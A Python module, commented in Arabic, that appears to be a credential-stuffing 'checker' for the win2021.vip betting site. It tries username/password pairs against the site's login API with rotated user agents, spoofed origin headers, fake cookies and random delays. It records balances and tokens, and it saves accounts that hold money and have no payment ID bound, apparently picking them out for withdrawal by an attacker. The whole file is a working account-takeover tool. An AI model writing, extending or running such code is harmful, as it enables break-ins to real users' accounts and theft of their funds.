from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
import random
import uuid
import time

class Win2021Checker(BaseChecker):
    """Win2021 site checker"""
    
    # الروابط الرئيسية
    LOGIN_URL = "https://www.win2021.vip/api/user/h5login"
    USER_INFO_URL = "https://www.win2021.vip/api/user/get_user_info"
    
    USER_AGENTS = [
        "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    ]
    
    def generate_headers(self):
        return {
            "User-Agent": random.choice(self.USER_AGENTS),
            "Content-Type": "application/json",
            "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "origin": "https://www.fun-box.vip",
            "referer": "https://www.fun-box.vip/",
            "accept-language": "en-US,en;q=0.9",
        }
    
    def generate_cookies(self):
        return {
            "think_var": random.choice(["en", "fr"]),
            "SITE_TOTAL_ID": uuid.uuid4().hex,
            "server_name_session": uuid.uuid4().hex[:32]
        }
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        try:
            session = requests.Session()
            session.headers.update(self.generate_headers())
            session.cookies.update(self.generate_cookies())
            
            time.sleep(random.uniform(0.1, 0.5))
            
            # 1. تسجيل الدخول
            login_payload = {
                "username": username,
                "password": password
            }
            
            login_response = session.post(
                self.LOGIN_URL,
                json=login_payload,
                timeout=15
            )
            
            if login_response.status_code != 200:
                return {"status": "bad", "username": username}
            
            login_data = login_response.json()
            
            if login_data.get("code") != 1:
                return {"status": "bad", "username": username}
            
            token = login_data.get("data", {}).get("userinfo", {}).get("token", "")
            if not token:
                return {"status": "error", "username": username}
            
            session.headers["token"] = token
            time.sleep(random.uniform(0.1, 0.3))
            
            # 2. الحصول على معلومات المستخدم
            info_response = session.post(
                self.USER_INFO_URL,
                json={},
                timeout=15
            )
            
            if info_response.status_code != 200:
                return {"status": "error", "username": username}
            
            info_data = info_response.json()
            user_data = info_data.get("data", {})
            
            # 3. استخراج البيانات المهمة
            money = float(user_data.get("money", 0))
            allow_rate = float(user_data.get("allow_withdraw_rate", 0))
            first_topup = float(user_data.get("first_topup", 0))
            
            # ✅ الشرط الجديد: التحقق من bian_pay_id
            bian_pay_id = user_data.get("bian_pay_id")  # قد يكون None, null, أو قيمة
            is_bian_pay_null = bian_pay_id is None or bian_pay_id == "" or bian_pay_id == "null"
            
            account_data = {
                "login": username,
                "password": password,
                "money": money,
                "allow_rate": allow_rate,
                "first_topup": first_topup,
                "token": token,
                "user_id": user_data.get("id", ""),
                "level": user_data.get("level", ""),
                "vip_level": user_data.get("vip_level", ""),
                "total_recharge": user_data.get("total_recharge", 0),
                "total_withdraw": user_data.get("total_withdraw", 0),
                # ✅ إضافة حقل bian_pay_id
                "bian_pay_id": bian_pay_id,
                "is_bian_pay_null": is_bian_pay_null,
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """شروط حفظ الحساب"""
        # الشرط الأصلي: رصيد أكبر من 0 وتم شحن أول مرة
        original_condition = account_data.get("money", 0) > 0 and account_data.get("first_topup", 0) > 0
        
        # ✅ الشرط الجديد: bian_pay_id يجب أن يكون null
        bian_pay_null_condition = account_data.get("is_bian_pay_null", False)
        
        # حفظ فقط إذا تحقق الشرطان معاً
        return original_condition and bian_pay_null_condition
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """تنسيق حفظ الحساب في الملف"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"money={account_data['money']} | " \
               f"rate={account_data['allow_rate']} | " \
               f"first_topup={account_data['first_topup']} | " \
               f"vip_level={account_data.get('vip_level', '')} | " \
               f"bian_pay_id={account_data.get('bian_pay_id', 'null')}\n"
    
    def get_stats_keyboard(self, stats: Dict[str, int]) -> Dict[str, Any]:
        return {
            "type": "inline_keyboard",
            "buttons": [
                [{"text": f"🔄 Checked: {stats['checked']}/{stats['total']}", "callback_data": "progress"}],
                [
                    {"text": f"✅ Valid: {stats['valid']}", "callback_data": "valid"},
                    {"text": f"❌ Bad: {stats['bad']}", "callback_data": "bad"}
                ],
                [
                    {"text": f"⚠️ Error: {stats['error']}", "callback_data": "error"},
                    {"text": f"💰 With Money: {stats['saved']}", "callback_data": "saved"}
                ]
            ]
        }
